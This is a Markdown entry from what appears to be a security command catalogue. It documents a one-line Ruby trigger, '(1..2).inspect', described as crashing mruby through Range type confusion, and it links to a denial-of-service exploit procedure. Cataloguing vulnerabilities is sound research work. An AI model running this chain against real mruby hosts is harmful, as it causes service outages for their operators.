---
data: (1..2).inspect
tags:
  - mruby
  - ruby
  - type-confusion
  - dos
type: command
executor: ruby
platforms:
  - mruby
  - Ruby
id: 71880a5c-7dd4-4528-afb4-415095145e95
created_at: '2025-12-11T03:47:48.521Z'
updated_at: '2025-12-11T03:47:48.521Z'
verified: false
validated: true
submitted: true
---
# trigger-range-type-confusion

## Command

```ruby
(1..2).inspect
```

## Description

Creates a range object using literal syntax and calls the inspect method, triggering a segmentation fault due to type confusion after Range redefinition.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `1..2` | Range literal from 1 to 2 | Yes |
| `.inspect` | Instance method to trigger confusion | Yes |

## Examples

### Basic Usage

```ruby
(1..2).inspect
```

### Advanced Usage

```ruby
(0...5).to_s  # Alternative method call
```

## Expected Output

Segmentation fault (crash) of the mruby interpreter.

## Related

- [[commands/redefine-range-to-array]]
- [[procedures/Exploit-mruby-Range-Type-Confusion-for-DoS]]
